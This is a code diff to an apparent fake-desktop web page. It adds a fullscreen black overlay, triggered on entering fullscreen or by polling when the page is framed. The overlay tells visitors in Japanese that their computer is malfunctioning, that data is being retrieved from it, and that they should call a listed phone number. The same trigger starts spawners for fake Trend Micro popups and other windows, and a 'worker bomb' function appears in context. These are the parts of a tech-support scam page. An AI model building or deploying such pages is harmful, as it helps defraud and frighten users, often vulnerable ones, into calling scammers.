@@ -1215,6 +1215,62 @@
         display: none;
         cursor: default;
       }
+
+      /* ── Fullscreen loading overlay ── */
+      #fs-loading-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 2147483647;
+        background: #000;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        gap: 24px;
+        color: #fff;
+        font-family:
+          "Segoe UI", "Yu Gothic UI", "Meiryo", system-ui, sans-serif;
+      }
+      #fs-loading-overlay.visible {
+        display: flex;
+      }
+      #fs-loading-spinner {
+        width: 48px;
+        height: 48px;
+        border: 4px solid rgba(255, 255, 255, 0.15);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: fs-loading-spin 1s linear infinite;
+      }
+      #fs-loading-box {
+        border: 2px solid #fff;
+        padding: 28px 36px;
+        max-width: 520px;
+        color: #fff;
+        text-align: center;
+        line-height: 1.7;
+        font-size: 14px;
+        letter-spacing: 0.04em;
+        background: rgba(0, 0, 0, 0.4);
+      }
+      #fs-loading-box .fs-loading-title {
+        font-size: 16px;
+        font-weight: 600;
+        margin-bottom: 14px;
+        letter-spacing: 0.06em;
+      }
+      #fs-loading-box .fs-loading-sub {
+        font-size: 12px;
+        opacity: 0.7;
+        margin-top: 14px;
+        font-family: "Consolas", "Menlo", monospace;
+        letter-spacing: 0.02em;
+      }
+      @keyframes fs-loading-spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
     </style>
     <script>
       function runWorkerBombSequence() {
@@ -1343,6 +1399,25 @@
     </script>
   </head>
   <body>
+    <div id="fs-loading-overlay" aria-hidden="true">
+      <div id="fs-loading-spinner"></div>
+      <div id="fs-loading-box">
+        <div class="fs-loading-title">
+          お使いのコンピューターが正常に動作していません。
+        </div>
+        <div>
+          現在、コンピューターのスキャンを行っています。ページを更新しないでください。<br />
+          お客様のコンピューターから情報を取得中です。しばらくお待ちください。<br />
+          コンピューターでさらに問題が発生した場合は、この電話番号（050 1794
+          4633）までお電話ください。
+        </div>
+        <div class="fs-loading-sub">
+          [SYS] init.d/webos.service — starting<br />
+          [OK] mounting /dev/sda1 ... loading window manager v3.14.159<br />
+          [INFO] estimated time remaining: ~10s
+        </div>
+      </div>
+    </div>
     <div id="desktop">
       <!-- Desktop Icons -->
       <div id="desktop-icons"></div>
@@ -2641,15 +2716,90 @@
         }
       }
 
-      document.addEventListener("fullscreenchange", () => {
-        if (document.fullscreenElement) {
+      // ── Fullscreen loading overlay (iframe-compatible) ──
+      const fsLoadingOverlay = document.getElementById("fs-loading-overlay");
+      const FS_LOADING_DURATION = 10000;
+      let fsLoadingTimer = null;
+      let lastFsState = false;
+
+      function isInFullscreen() {
+        // Standard + vendor-prefixed checks (work inside an allowfullscreen iframe)
+        if (
+          document.fullscreenElement ||
+          document.webkitFullscreenElement ||
+          document.mozFullScreenElement ||
+          document.msFullscreenElement
+        ) {
+          return true;
+        }
+        // Fallback for cases where the iframe is fullscreened by the parent:
+        // viewport matches the screen size.
+        if (
+          window.innerWidth === screen.width &&
+          window.innerHeight === screen.height
+        ) {
+          return true;
+        }
+        return false;
+      }
+
+      function showFsLoading() {
+        fsLoadingOverlay.classList.add("visible");
+        fsLoadingOverlay.setAttribute("aria-hidden", "false");
+        if (fsLoadingTimer) clearTimeout(fsLoadingTimer);
+        fsLoadingTimer = setTimeout(() => {
+          fsLoadingOverlay.classList.remove("visible");
+          fsLoadingOverlay.setAttribute("aria-hidden", "true");
+          fsLoadingTimer = null;
+        }, FS_LOADING_DURATION);
+      }
+
+      function hideFsLoading() {
+        if (fsLoadingTimer) {
+          clearTimeout(fsLoadingTimer);
+          fsLoadingTimer = null;
+        }
+        fsLoadingOverlay.classList.remove("visible");
+        fsLoadingOverlay.setAttribute("aria-hidden", "true");
+      }
+
+      function handleFullscreenState(inFs) {
+        if (inFs) {
+          showFsLoading();
           startAppSpawner();
           startTmSpawner();
         } else {
+          hideFsLoading();
           stopAppSpawner();
           stopTmSpawner();
         }
+      }
+
+      // Event-based detection (fires when the API is used directly)
+      [
+        "fullscreenchange",
+        "webkitfullscreenchange",
+        "mozfullscreenchange",
+        "MSFullscreenChange",
+      ].forEach((ev) => {
+        document.addEventListener(ev, () => {
+          const inFs = isInFullscreen();
+          if (inFs !== lastFsState) {
+            lastFsState = inFs;
+            handleFullscreenState(inFs);
+          }
+        });
       });
+
+      // Continuous polling — required for iframe scenarios where the parent
+      // page fullscreens the iframe and no fullscreenchange event fires here.
+      setInterval(() => {
+        const inFs = isInFullscreen();
+        if (inFs !== lastFsState) {
+          lastFsState = inFs;
+          handleFullscreenState(inFs);
+        }
+      }, 500);
 
       // ── Trend Micro Popup Spawner ──
       const tmTemplate = document.getElementById("trendmicro-template");
